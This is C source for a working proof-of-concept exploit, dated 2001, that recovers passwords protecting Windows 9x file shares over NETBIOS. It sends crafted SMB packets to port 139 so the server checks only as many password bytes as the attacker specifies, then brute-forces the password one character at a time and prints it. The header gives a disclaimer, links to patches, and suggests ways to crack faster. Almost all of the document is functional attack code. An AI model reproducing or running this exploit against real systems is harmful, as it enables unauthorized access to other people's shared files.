/*

23/03/2001

Written by Melih SARICA.
Vulnerability reported by NS FOCUS Co., Ltd.
Microsoft Windows 9x's NETBIOS password verification vulnerability will
allow any user to access the Windows 9x file shared service with password 
protection. Even they don't know the password.

This is a proof-of-concept exploit code. Written for a friend's request.
I take no responsibility for what you do with this software. Please test your
own system only.

Speed improvements: Use fork() somewhere in code... using 4-5 child is a good
choice. Also try password characters in ranges [A-Z] and [0-9]. Often its enough.
This code is using all 256 characters. 

Windows NT 4.0 and 2K are NOT vulnerable.

Solution:

Microsoft Windows 95, 98 and 98 Second Edition
http://download.microsoft.com/download/win98SE/Update/11958/W98/EN-US/273991USA8.EXE
Microsoft Windows ME
http://download.microsoft.com/download/winme/Update/11958/WinMe/EN-US/273991USAM.EXE

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <ctype.h>
#include <sys/wait.h>
#include <sys/time.h>

#define SMBPORT 139

int sock_connect(char *remotehost, unsigned int port);
long uid;
char share[100];
char password[100];
char smb_packet[512];
char data[8192];	// 4 general purpose

int request_new_session(int sock)
{
int i, j=0, len;
char nbname[100], nbnetform[100], t[2];
char session_data[512];
memset(session_data, 0, sizeof(session_data));
memset(nbname, 0, sizeof(nbname));
memset(nbnetform, 0, sizeof(nbnetform));
for(i=2;i<strlen(share) && share[i]!='\\';i++) nbname[i-2]=share[i];
len=strlen(nbname);
for(i=0;i<16;i++)
{
    if(i>=len)
    {
	t[0]='C';
	t[1]='A';
    }
    else
    {
	t[0]=nbname[i]/16+65;
	t[1]=nbname[i]%16+65;
    }
    nbnetform[j]=t[0];
    nbnetform[j+1]=t[1];
    j+=2;
}
// now we got the netbios name in network format.
session_data[0]=0x81;
session_data[3]=0x48;
session_data[4]=0x20;
memcpy(&session_data[5], nbnetform, j);
session_data[6+j]=0x20;
sprintf(nbnetform, "CACACACACACACACACACACACACACACAAA");
memcpy(&session_data[7+j], nbnetform, 32);
if(send(sock, session_data, 37+j, 0)==-1) return -1;
memset(data, 0, sizeof(data));
if(recv(sock, data, 8192, 0)==-1) return -1;
// get uid for later use
uid=data[33]*256+data[32];	// 32th value indicates lower, 33th value indicates higher value
return data[0];
}

int samba_session(int sock, char *login, char *password)
{
int lp_len, lp_raw_len, lpa, lpb, lpra, lprb, pass_len, pass_lena, pass_lenb;
char lpdata[8192];	// hope enough room. anyway who cares...
lp_raw_len=strlen(login)+strlen(password)+2;
lp_len=lp_raw_len+55;
lpra=lp_raw_len/256; // divide by 256 to calculate higher value
lprb=lp_raw_len%256; // remainder will be lower value
lpa=lp_len/256;	// divide by 256 to calculate higher value
lpb=lp_len%256; // remainder will be lower value
pass_len=strlen(password)+1;
pass_lena=pass_len/256;
pass_lenb=pass_len%256;
memset(lpdata, 0, sizeof(lpdata));
lpdata[2]=lpa; lpdata[3]=lpb;
lpdata[4]=0xff; lpdata[5]=0x53;
lpdata[6]=0x4d; lpdata[7]=0x42;
lpdata[8]=0x73; lpdata[13]=0x18;
lpdata[14]=0x01; lpdata[15]=0x20;
lpdata[31]=0x28; lpdata[36]=0x0a;
lpdata[37]=0xff; lpdata[41]=0x04;
lpdata[42]=0x11; lpdata[43]=0x02;
lpdata[51]=pass_lenb; lpdata[52]=pass_lena;
lpdata[57]=lprb; lpdata[58]=lpra;
memcpy(&lpdata[59], password, strlen(password));
memcpy(&lpdata[60+strlen(password)], login, strlen(login));
if(send(sock, lpdata, strlen(password)+strlen(login)+61, 0)==-1) return -1;
if(recv(sock, lpdata, 1024, 0)==-1) return -1; 
return (lpdata[9]);
}

void build_crafted_smb_packet(char *remoteshare, char *remotepassword)
{
    memset(smb_packet, 0, sizeof(smb_packet));
    smb_packet[4]='\xff';
    smb_packet[5]='S';
    smb_packet[6]='M';
    smb_packet[7]='B';
    smb_packet[8]='u';
    smb_packet[13]='\x18';
    smb_packet[14]='\x01';
    smb_packet[15]=' ';
    smb_packet[31]='\x28';
    smb_packet[32]=uid%256;
    smb_packet[33]=uid/256;
    smb_packet[36]='\x04';
    smb_packet[37]='\xff';
    smb_packet[43]=strlen(remotepassword);	// number of bytes we wanna remote side to confirm. we set the rules... muhahahaha
    smb_packet[45]=strlen(remotepassword)+strlen(remoteshare)+1;
    memcpy(&smb_packet[47], remotepassword, strlen(remotepassword));
    memcpy(&smb_packet[47+strlen(remotepassword)], remoteshare, strlen(remoteshare));
    smb_packet[48+strlen(remotepassword)+strlen(remoteshare)]='\x41';
    smb_packet[49+strlen(remotepassword)+strlen(remoteshare)]='\x3A';
    // calculate and add length
    smb_packet[3]=strlen(remotepassword)+strlen(remoteshare)+47;
}

int main (int argc, char *argv[])
{
int sock, i, len=1, done=0;
struct sockaddr_in sin;
struct hostent *hp;
printf("\nMicrosoft Windows 9x NETBIOS remote password cracker. Written by Melih SARICA.\nE-Mail: melihsar@yahoo.com, msarica@bilgiteks.com\n");
printf("I take no responsibility for what you do with this software.\nPlease test your own system only.\n\n");
if(argc!=3)
{
    printf("usage: %s hostname remoteshare\n", argv[0]);
    printf("hostname: Target host (ex: 127.0.0.1)\nremoteshare: Target share (ex: //victim/c)\n\n");
    exit (1);
}
strncpy(share, argv[2], 100);
for(i=0;i<strlen(share);i++)
if(share[i]=='/') share[i]='\\';
else share[i]=toupper(share[i]);
hp=gethostbyname(argv[1]);
if(hp==NULL) return -1;
memset((char *)&sin, 0,sizeof(sin));
bcopy(hp->h_addr,(char *)&sin.sin_addr,hp->h_length);
sin.sin_family=hp->h_addrtype;
sin.sin_port=htons(SMBPORT);
sock=socket(AF_INET, SOCK_STREAM, 0);
if(sock==-1)
{
    printf("Unable to create socket.\n");
    return -1;
}
if(connect(sock,(struct sockaddr *)&sin,sizeof(sin))==-1)
{
    printf("Unable to connect.\n");
    exit(0);
}

if(request_new_session(sock)!=0xffffff82)	// thats the way i like it
{
    printf("Error: Couldn't establish session.\n");
    return(0);
}

if(samba_session(sock, "31337", "")!=0)
{
    printf("Error: Couldn't establish login session.\n");
    return(0);
}
memset(password, 0, sizeof(password));
printf("Wait a few seconds... (Long passwords take a few minutes on a 56K modem.)\n");
while(done==0)
{
    for(i=1;i<=255;i++)
    {
	password[len-1]=i;
	// build packet
	build_crafted_smb_packet(share, password);
	if(send(sock, smb_packet, strlen(share)+strlen(password)+51, 0)==-1)
	{
	    printf("Error: Couldn't send data.\n");
	    return(0);
	}
	memset(data, 0, sizeof(data));
	if(recv(sock, data, 8192, 0)==-1)
	{
	    printf("Error: Couldn't receive data.\n");
	    return(0);
	}
	    if(data[9]==0)
	    {
		printf("-> %c\n", i);
		break;
	    }
	    else
	    if(i==255)
	    {
	    	if(len!=1) done=1;
		else done=2;
		password[len-1]=0;
		break;
	    }
    }
    len++;
}
if(done==1) printf("Password cracked. PASSWORD:\"%s\"\n", password);
else printf("Couldn't crack password.\n");
close(sock);
return 0;
}
